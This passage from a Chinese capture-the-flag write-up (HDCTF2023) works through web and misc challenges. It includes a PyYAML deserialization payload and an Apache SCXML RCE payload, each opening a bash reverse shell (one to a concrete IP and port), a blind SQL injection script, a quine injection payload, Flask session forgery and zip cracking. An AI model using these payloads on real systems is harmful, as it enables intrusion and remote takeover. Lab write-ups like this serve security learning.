class="hljs-string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> m:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span><br>        <span class="hljs-keyword">if</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span><br>        res = urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(ex))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):<br>   <span class="hljs-keyword">for</span> blackstr <span class="hljs-keyword">in</span> BLACK_LIST:<br>       <span class="hljs-keyword">if</span> blackstr <span class="hljs-keyword">in</span> filename:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>            flash(<span class="hljs-string">&#x27;No file part&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(request.url)<br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Empty file&quot;</span><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">and</span> allowed_file(file.filename):<br>            filename = secure_filename(file.filename)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&#x27;./uploads/&#x27;</span>):<br>                os.makedirs(<span class="hljs-string">&#x27;./uploads/&#x27;</span>)<br>            file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;upload successfully!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/boogipop&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;passport&quot;</span>)==<span class="hljs-string">&quot;Welcome To HDCTF2023&quot;</span>:<br>        LoadedFile=request.args.get(<span class="hljs-string">&quot;file&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(LoadedFile):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file not exists&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(LoadedFile) <span class="hljs-keyword">as</span> f:<br>            yaml.full_load(f)<br>            f.close()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;van you see&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Auth bro&quot;</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwdpath = os.popen(<span class="hljs-string">&quot;pwd&quot;</span>).read()<br>    app.run(<br>        debug=<span class="hljs-literal">False</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br><br></code></pre></td></tr></table></figure><p>我们阅读一下read路由的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>m = re.findall(<span class="hljs-string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)<br>n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br><span class="hljs-keyword">if</span> m:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span><br><span class="hljs-keyword">if</span> n:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span><br>res = urlopen(url)<br><span class="hljs-keyword">return</span> res.read()<br></code></pre></td></tr></table></figure><p>我们发现获得的url会使用 <code>urlopen()</code>去读取指定url的内容，因此，我们可以url编码两次，第一次浏览器自动解码，然后获得被编码一次的url，这时可以绕过 <code>re.findall()</code>正则，<code>urlopen()</code>函数可以解析包含urlencode的网址，这样我们知道为什么可以两次编码绕过了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br></code></pre></td></tr></table></figure><p>这一段代码，<code>random.seed()</code>函数将会指定一个随机数种子，如果是固定值的话，会产生伪随机，每次固定位置的随机数都是一样的</p><blockquote><p><code>uuid.getnode()</code>函数用于获取网络接口的MAC地址。如果机器具有多个网络接口，则返回通用管理的MAC地址，而不是通过本地管理的MAC地址返回。管理的MAC地址保证是全局唯一的</p></blockquote><p><code>uuid.getnode()</code>可以用来获取网口的mac地址，因此是一个固定值，会生成伪随机，我们需要获取到mac地址</p><img src="https://s2.loli.net/2023/04/28/g9OC581ytisKUVb.png" alt="image-20230428113423797" style="zoom:33%;" /><p>我们可以使用：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0/address<br></code></pre></td></tr></table></figure><p>获取 eth0 网卡的mac地址</p><img src="https://s2.loli.net/2023/04/28/KgwbrZAGf2TLnNk.png" alt="image-20230428113543582" style="zoom:33%;" /><p>这是16进制的值，于是我们可以使用脚本生成 <code>SECRET_KEY</code>的值了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> uuid<br><br>random.seed(<span class="hljs-number">0x0242ac025164</span>)<br><span class="hljs-built_in">print</span>(random.random()*<span class="hljs-number">233</span>)<br><br><span class="hljs-comment"># 16.703189614984886</span><br></code></pre></td></tr></table></figure><p>得到key，我们可以使用 session伪造脚本伪造session了</p><p><img src="https://s2.loli.net/2023/04/28/uZD1X4zqpAjTcsU.png" alt="image-20230428113758500"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/boogipop&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;passport&quot;</span>)==<span class="hljs-string">&quot;Welcome To HDCTF2023&quot;</span>:<br>        LoadedFile=request.args.get(<span class="hljs-string">&quot;file&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(LoadedFile):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file not exists&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(LoadedFile) <span class="hljs-keyword">as</span> f:<br>            yaml.full_load(f)<br>            f.close()<br></code></pre></td></tr></table></figure><p>这里主要利用 <code>boogipop</code>路由，<strong>yaml反序列化</strong></p><p>这个暂时不太会，直接放payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">str</span><br>    args: []<br>    state: !!python/<span class="hljs-built_in">tuple</span><br>      - <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;</span><br>      - !!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">staticmethod</span><br>        args: []<br>        state:<br>          update: !!python/name:<span class="hljs-built_in">eval</span><br>          items: !!python/name:<span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure><p>我们将IP、port改为自己的，然后在服务器开启监听，上传这个文件，然后利用boogipop路由即可：</p><p><img src="https://s2.loli.net/2023/04/28/chQam2LvRYqZUuD.png" alt="image-20230428114313417"></p><p>注意改一下session</p><p><img src="https://s2.loli.net/2023/04/28/KZU5rnYScgzbHsA.png" alt="image-20230428114353862"></p><p>在<code>/proc/1/environ</code> 发现flag</p><h4 id="LoginMaster"><a href="#LoginMaster" class="headerlink" title="LoginMaster"></a>LoginMaster</h4><p><strong>robots.txt泄露</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSql</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="hljs-variable">$s</span>))&#123;<br>        <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$password</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$FLAG</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&quot;wrong password&quot;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>sql注入题目，username必须为admin，此处我们需要从密码着手</p><p>但是注意看，过滤了 <code>in</code> ，意味着我们不能使用 <code>information_schema</code>库查询表名，列名</p><p>我本来是想找一下除了<code>information_schema</code>库，还有哪些库能用来查询的，找了这么几个：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">mysql.innodb_table_stats<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br></code></pre></td></tr></table></figure><p>这几个都能用来查询表名，此处我们可以使用下面两个，我们我们写脚本去查询表名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://node5.anna.nssctf.cn:28973&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>s = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;_.,&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-comment"># payload = &quot;1&#x27;/**/or/**/if((mid((select/**/version()),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;.format(i, j) # 10_2_32-mariadb</span><br>        <span class="hljs-comment"># payload = &quot;1&#x27;/**/or/**/if((mid((select/**/database()),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;.format(i, j) # ciscn</span><br>        <span class="hljs-comment"># payload = &quot;1&#x27;/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;.format(i, j)</span><br>        payload = <span class="hljs-string">&quot;1&#x27;/**/or/**/if((mid((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics/**/where/**/table_schema/**/like/**/&#x27;ciscn&#x27;),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span>.<span class="hljs-built_in">format</span>(i, j)<br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: payload<br>        &#125;<br>        req = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment"># print(req.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hacker&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;something&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;someting&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>发现啥都查不出来。。</p><p>实际上此处为一张空表，我们需要使用另一种做法(<strong>quine</strong>)</p><p>重点的代码是这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$password</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$FLAG</span>);<br>    &#125; <br></code></pre></td></tr></table></figure><p>我们除了让输入的密码与真正的密码一致外，还可以让<strong>输入的结果与输出的结果相同</strong>，同样可以实现获得flag</p><p>举个例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> replace(replace(<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/GhX91m7y3JwE85Y.png" alt="image-20230423152442610"></p><p>输入和输出结果一致，从而可以绕过</p><p>这里需要知道一下原理：</p><p><a href="https://www.anquanke.com/post/id/253570#h2-9">从三道赛题再谈Quine trick</a></p><p><a href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）</a></p><p><a href="https://www.cnblogs.com/aninock/p/16467716.html">NSS日刷-[第五空间 2021]yet_another_mysql_injection-Qunie</a></p><p>看着有点烧脑，其实就是套娃</p><p>我们首先尝试一下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> REPLACE(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/rtYn4WiP9T2D7Io.png" alt="image-20230423153453045"></p><p>输出是一个小数点 .</p><p>我们尝试将 上一段代码中的小数点 <strong>.</strong> 替换为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">REPLACE(&quot;.&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;.&quot;)   <span class="hljs-comment">-- 这里使用双引号包裹，防止单双引号重叠</span><br></code></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> REPLACE(<span class="hljs-string">&#x27;REPLACE(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;REPLACE(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/Qsg7HvIrREJfYFN.png" alt="image-20230423153432347"></p><p>乍一看好像是一样的，但是单双引号有点区别，我们需要再套<code>REPLACE</code>替换一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> replace(replace(<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/yma7of36rFAWenx.png" alt="image-20230423155242323"></p><p>是真的麻烦。。</p><p>基本上就是这种思路了</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;</span><span class="hljs-number">1</span>&quot;UNION(SELECT(REPLACE(REPLACE(&quot;<span class="hljs-operator">%</span>&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;<span class="hljs-operator">%</span>&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;<span class="hljs-keyword">UNION</span>(<span class="hljs-keyword">SELECT</span>(REPLACE(REPLACE(&quot;%&quot;,<span class="hljs-type">CHAR</span>(<span class="hljs-number">34</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">CHAR</span>(<span class="hljs-number">37</span>),&quot;%&quot;)))#<span class="hljs-string">&#x27;)))#</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/Qi3aLjHIevkZFd4.png" alt="image-20230423155425281"></p><h4 id="BabyJxVx"><a href="#BabyJxVx" class="headerlink" title="BabyJxVx"></a>BabyJxVx</h4><blockquote><p>考点：Apache SCXML2 RCE</p></blockquote><p><a href="https://www.yuque.com/boogipop/okvgcs/zzx3n35xsg26ss0e?view=doc_embed">Apache SCXML2 RCE分析</a></p><p>暂时不懂为什么</p><p>直接放payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scxml</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">initial</span>=<span class="hljs-string">&quot;run&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">final</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;run&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">onexit</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">assign</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">expr</span>=<span class="hljs-string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMjkuMTcwLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">onexit</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">final</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">scxml</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后上传到服务器上面，<code>poc.xml</code></p><p>注意base64要替换为自己的vps信息，然后在服务器上开启监听：</p><img src="https://s2.loli.net/2023/04/28/QkzTJGgnpCYmEwq.png" alt="image-20230428115926577" style="zoom:50%;" /><p><img src="https://s2.loli.net/2023/04/28/iSUQgdNza9xtkAT.png" alt="image-20230428120008392"></p><p>然后命令执行得flag</p><img src="https://s2.loli.net/2023/04/28/HD6uw28tZUVKPxk.png" alt="image-20230428120105755" style="zoom:33%;" /><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="hardMisc"><a href="#hardMisc" class="headerlink" title="hardMisc"></a>hardMisc</h4><p>010打开，base64解码</p><p><img src="https://s2.loli.net/2023/04/23/Cpm6MVAWPBNkRhn.png" alt="image-20230423155953654"></p><h4 id="MasterMisc"><a href="#MasterMisc" class="headerlink" title="MasterMisc"></a>MasterMisc</h4><p><img src="https://s2.loli.net/2023/04/23/PZ7zjbhpCr8K9IL.png" alt="image-20230423160525223"></p><p>打开发现有很多压缩包，</p><p>百度查了一下，这种是<code>分卷压缩包</code>，我们可以在cmd中输入如下命令，合并为一个压缩包：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">copy</span> /B topic.<span class="hljs-keyword">zip</span>.001+topic.<span class="hljs-keyword">zip</span>.002+topic.<span class="hljs-keyword">zip</span>.003+topic.<span class="hljs-keyword">zip</span>.004+topic.<span class="hljs-keyword">zip</span>.005+topic.<span class="hljs-keyword">zip</span>.006 topic.<span class="hljs-keyword">zip</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/OTIaA9qfQHRj4Mr.png" alt="image-20230423161002616"></p><p>爆破一下找到压缩包密码，使用<code>foremost</code>分离图片：</p><p>得到一个wav音频和一张绿色的图片，我们使用<code>Audacity</code>看一下频谱图：</p><p><img src="https://s2.loli.net/2023/04/23/UKqwkQuHBLi73Sm.png" alt="image-20230423161240384"></p><p>找到一部分flag</p><p>使用010修改绿色图片高度：</p><p><img src="https://s2.loli.net/2023/04/23/Dkm7UM6NtRAZQIP.png" alt="image-20230423161334548"></p><p>得到另一部分flag，</p><p>最后一部分在<code>topic.png</code>中找到：</p><p><img src="https://s2.loli.net/2023/04/23/8dBH2RcpnGUzJWS.png" alt="image-20230423161418358"></p><p>NSSCTF{e67d8104-7536-4433-bfff-96759901c405}</p><h4 id="ExtremeMisc"><a href="#ExtremeMisc" class="headerlink" title="ExtremeMisc"></a>ExtremeMisc</h4><p>一张 <code>IDAT.png</code> 首先使用 foremost分离一下，得到一个 <code>Dic.zip</code></p><p>使用 <code>Ziperello</code>工具说没有加密，还以为是伪加密。。坑人</p><p>其实这里的密码是字母（以前一般都是数字），使用<code>Archpr</code>爆破得到密码：<code>haida</code></p><p>打开<code>Reverse.piz</code>：</p><p><img src="https://s2.loli.net/2023/04/23/4gwfGaDMRi3b8nK.png" alt="image-20230423173129578"></p><p>很明显，这里每一个字节都需要反转一下，需要写个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/Reverse.piz&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>data = f.read()<br>fzip = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/fzip.zip&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>s = <span class="hljs-string">b&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    tmp = <span class="hljs-built_in">int</span>((<span class="hljs-string">&quot;%02x&quot;</span> % i)[::-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>    s += <span class="hljs-built_in">bytes</span>([tmp])<br>    <span class="hljs-comment"># print(tmp.to_bytes(1, &#x27;little&#x27;))</span><br><br>fzip.write(s)<br><br>首先以二进制形式读取文件给data，然后遍历这些二进制字符串，<br>注意：<span class="hljs-built_in">int</span>((<span class="hljs-string">&quot;%02x&quot;</span> % i)[::-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)  我们将二进制转化为<span class="hljs-number">16</span>进制然后宽度为<span class="hljs-number">2</span>，不够使用<span class="hljs-number">0</span>填充，<br>然后反转一下，并使用<span class="hljs-built_in">int</span>()函数转为<span class="hljs-number">10</span>进制<br>然后将<span class="hljs-number">10</span>进制数字转为字节<span class="hljs-built_in">bytes</span>([])进行拼接，最后以二进制格式写入<br></code></pre></td></tr></table></figure><p>写这种编码转化的脚本不是很会，需要多学一学</p><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c03/p05_pack_unpack_large_int_from_bytes.html">字节到大整数的打包与解包</a></p><p>然后再使用爆破zip，获得如下文件：</p><p><img src="https://s2.loli.net/2023/04/23/IZ4RtANWpmS6jaX.png" alt="image-20230423174633982"></p><p>很明显，在<code>Plain.zip</code>中存在内容已知的 <code>secret.txt</code>文件，我们可以使用明文爆破，<code>ARCHPR</code>或<code>bkcrack</code></p><p>这里我们选择 <code>bkcrack</code>速度快一点：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">./</span><span class="hljs-variable">bkcrack</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-built_in">Plain</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;secret.txt&quot;</span> <span 